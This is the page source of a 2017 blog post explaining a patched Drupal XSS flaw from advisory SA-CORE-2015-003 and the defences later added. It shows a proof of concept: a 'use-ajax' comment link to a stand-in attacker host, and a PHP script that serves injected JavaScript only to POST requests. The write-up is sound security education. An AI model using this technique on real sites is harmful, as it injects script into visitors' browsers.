<!DOCTYPE html>
<html lang="en" dir="ltr" prefix="og: https://ogp.me/ns#">
  <head>
    <meta charset="utf-8" />
<meta property="og:site_name" content="Samuel Mortenson" />
<link rel="canonical" href="https://mortenson.coffee/blog/getting-creative-drupal-xss" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Getting creative with Drupal XSS" />
<meta name="description" content="In the world of web security, cross-site scripting (XSS) vulnerabilities are extremely common, and will continue to be a problem as web applications become increasingly complex. According to a 2016 report by Bugcrowd, a popular bug bounty site,¬†‚ÄúXSS vulnerabilities account for 66% of valid submissions, followed by 20% categorized as CSRF‚Äù¬†(source)." />
<meta name="twitter:site" content="@mortensonsam" />
<meta property="og:url" content="https://mortenson.coffee/blog/getting-creative-drupal-xss" />
<meta property="og:title" content="Getting creative with Drupal XSS" />
<meta name="twitter:creator" content="@mortensonsam" />
<meta name="twitter:url" content="https://mortenson.coffee/blog/getting-creative-drupal-xss" />
<meta property="og:description" content="In the world of web security, cross-site scripting (XSS) vulnerabilities are extremely common, and will continue to be a problem as web applications become increasingly complex. According to a 2016 report by Bugcrowd, a popular bug bounty site,¬†‚ÄúXSS vulnerabilities account for 66% of valid submissions, followed by 20% categorized as CSRF‚Äù¬†(source)." />
<meta property="article:tag" content="drupal" />
<meta property="article:tag" content="security" />
<meta property="article:published_time" content="2017-05-28T15:52:44+00:00" />
<meta property="article:modified_time" content="2020-01-27T17:48:12+00:00" />
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
<meta name="MobileOptimized" content="width" />
<meta name="HandheldFriendly" content="true" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="shortcut icon" href="/themes/custom/mortenson/favicon.png" type="image/png" />
<link rel="revision" href="https://mortenson.coffee/blog/getting-creative-drupal-xss" />

    <title>Getting creative with Drupal XSS | Samuel Mortenson</title>
    <link rel="stylesheet" media="all" href="/sites/default/files/css/css_-veq5M6pR4AIMYTZL3BDItdS30a5YPFyk9pyVnYEpro.css" />
<link rel="stylesheet" media="all" href="/sites/default/files/css/css_O2d4H1n2uWwAkyKoDLJPDQjLf8xs48X2j3KYqwzl4p4.css" />

    
<!--[if lte IE 8]>
<script src="/sites/default/files/js/js_VtafjXmRvoUgAzqzYTA3Wrjkx9wcWhjP0G4ZnnqRamA.js"></script>
<![endif]-->

  </head>
  <body>
    <a href="#main-content" class="visually-hidden focusable">
      Skip to main content
    </a>
    
      <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas>
      <header class="mc-header container ">
          <a href="/blog" class="mc-header__back">Back to blog</a>
              <a href="/" class="mc-header__name">
            Samuel<br />Mortenson
          </a>
          </header><main id="main-content">
    <div>
    <div data-drupal-messages-fallback class="hidden"></div>  <article class="mc-blog container container--margin" role="article">
        <div class="mc-blog-title container">
    <div class="mc-blog-title__bg"></div>
    <h1 class="mc-blog-title__title">Getting creative with Drupal XSS</h1>
  </div>    <div class="mc-blog__byline">
      May 28th, 2017
    </div>
    <div class="mc-blog__text">
      
            <div><p>In the world of web security, cross-site scripting (XSS) vulnerabilities are extremely common, and will continue to be a problem as web applications become increasingly complex. According to a 2016 report by Bugcrowd, a popular bug bounty site,¬†<strong>‚ÄúXSS vulnerabilities account for 66% of valid submissions, followed by 20% categorized as CSRF‚Äù</strong>¬†(<a href="https://pages.bugcrowd.com/hubfs/PDFs/state-of-bug-bounty-2016.pdf">source</a>). That same report goes into some detail about the severity of XSS (page 23), which is worth reading to understand the scope of this kind of attack.</p>
<p>Drupal developers are mostly protected from XSS by the HTML filtering system, but custom code can still allow attacks using unconventional exploits.</p>
<p>For a simple web application, finding an XSS vulnerability may seem trivial. Looking at online resources, you often find code snippets like this:</p>
<figure><pre>
<code data-lang="php" class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Search results for "<span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $_GET[<span class="hljs-string">'q'</span>]; <span class="hljs-meta">?&gt;</span></span>":<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></code></pre></figure><p>but now-a-days, finding an exploit this obvious is unlikely, unless you‚Äôre looking at something completely hand-built. Drupal 8 makes code like this is even more unlikely, given that the templating system has moved to Twig, which escapes output by default and does not allow arbitrary PHP statements.</p>
<p>So what kind of Drupal code can trigger XSS? Let‚Äôs look at a practical example based on¬†<a href="https://www.drupal.org/SA-CORE-2015-003">SA-CORE-2015-003</a>, which was a security release I helped out on.</p>
<p><em>Note: The following exploit has already been fixed, don‚Äôt freak out!</em></p>
<p>Drupal has an internal AJAX system that responds to events on HTML elements, reaching out to a JSON endpoint to perform what‚Äôs known as AJAX commands. An example of this is the autocomplete element, which triggers AJAX requests as a user types to determine autocomplete suggestions.</p>
<p>You can enhance your HTML elements with this behavior like so:</p>
<figure><pre>
<code data-lang="javascript" class="hljs css"><span class="hljs-selector-tag">Drupal</span><span class="hljs-selector-class">.ajax</span>({
  <span class="hljs-attribute">url</span>: <span class="hljs-string">'/foo'</span>,
  event: <span class="hljs-string">'click'</span>,
  element: $(<span class="hljs-string">'#my-great-link'</span>),
});</code></pre></figure><p>but to make things easier for developers, Drupal will automatically bind AJAX behaviors to any element with the ‚Äúuse-ajax‚Äù class. This may not seem like a big deal, but many Drupal sites allow users to input HTML, and classes are often allowed in default text filters.</p>
<p>To re-cap, this is what we know at this point:</p>
<ol><li>Drupal allows users to enter HTML by default in areas like comments</li>
<li>The XSS filtering in Drupal is really good, so assume we can‚Äôt bypass it</li>
<li>The class attribute is allowed in the default text filter</li>
<li>The AJAX system automatically binds on elements with the ‚Äúuse-ajax‚Äù class</li>
</ol><p>Knowing this, we can make a comment like this:</p>
<figure><pre>
<code data-lang="html" class="hljs javascript">&lt;a href=<span class="hljs-string">"http://mynastysite.com/xss.php"</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">"use-ajax"</span>&gt;Click me!<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre></figure><p>and know that when the link is clicked, a POST request is made to an arbitrary URL, and Drupal will parse the response and process AJAX commands.</p>
<p>The xss.php script on our endpoint could look something like this:</p>
<figure><pre>
<code data-lang="php" class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-comment">// Only display the spoof response if the method is POST, this way normal users</span>
<span class="hljs-comment">// (i.e. non-admins) will see a normal page.</span>
<span class="hljs-keyword">if</span> ($_SERVER[<span class="hljs-string">'REQUEST_METHOD'</span>] === <span class="hljs-string">'POST'</span>) {
  <span class="hljs-comment">// Allow any site to make a POST request here.</span>
  header(<span class="hljs-string">'Access-Control-Allow-Origin: *'</span>);
  <span class="hljs-comment">// Form a bare-bones JSON response for Drupal.</span>
  $foo = <span class="hljs-keyword">new</span> stdClass();
  $foo-&gt;command = <span class="hljs-string">'insert'</span>;
  $foo-&gt;data = <span class="hljs-string">'&lt;script&gt;alert("xss")&lt;/script&gt;'</span>;
  $foo-&gt;method = <span class="hljs-string">'append'</span>;
  $foo-&gt;selector = <span class="hljs-string">'body'</span>;
  <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>($foo));
}
<span class="hljs-comment">// Display the normal page for GET requests.</span>
<span class="hljs-keyword">else</span> {
  <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h1&gt;This is a normal site!&lt;/h1&gt;"</span>;
}</span></code></pre></figure><p>Now when a user clicks our link, we can execute arbitrary Javascript in Drupal!</p>
<p>The Drupal security team has since improved the AJAX system by adding two layers of defense:</p>
<ol><li>When an AJAX-enabled element triggers its event (i.e. is clicked), Drupal verifies that the URL is local before making the request (see¬†<a href="http://cgit.drupalcode.org/drupal/tree/core/misc/drupal.js?id=d5d37e06490825d10c52545433773e22fe6b61fb#n146">Drupal.url.isLocal</a>).</li>
<li>If a response does not contain a X-Drupal-Ajax-Token header, it is not processed. This prevents users from making local requests to uploaded files (see¬†<a href="http://cgit.drupalcode.org/drupal/tree/core/misc/ajax.js?id=d5d37e06490825d10c52545433773e22fe6b61fb#n220">Drupal.Ajax.options.success</a>).</li>
</ol><p>This has been fixed for about two years, but it‚Äôs a great example of how complex XSS vulnerabilities in Drupal can be.</p>
<p>My biggest takeaway from this is that¬†<em>you don‚Äôt need to bypass the XSS filter to trigger XSS.</em>¬†Get creative with your research, and don‚Äôt hope to find quick-win exploits in code like:</p>
<figure><pre>
<code data-lang="twig" class="hljs twig"><span class="hljs-template-variable">{{ twig_input | raw }}</span></code></pre></figure><p>because it‚Äôs unlikely that you‚Äôll get that lucky. üòÅ</p>
</div>
      
    </div>
  </article>

  </div>

</main>
  <footer class="mc-footer container">
    <ul class="mc-footer__menu">
      <li><a href="/search">Search</a></li>
      <li><a href="/blog">Blog</a></li>
      <li><a href="/work">Work</a></li>
      <li><a href="/gallery">Gallery</a></li>
      <li><a href="mailto:samuel@mortenson.coffee">Contact</a></li>
    </ul>
    <div class="mc-footer__copyright">¬©2020 Samuel Mortenson</div>
  </footer>
  </div>

    
    
  </body>
</html>
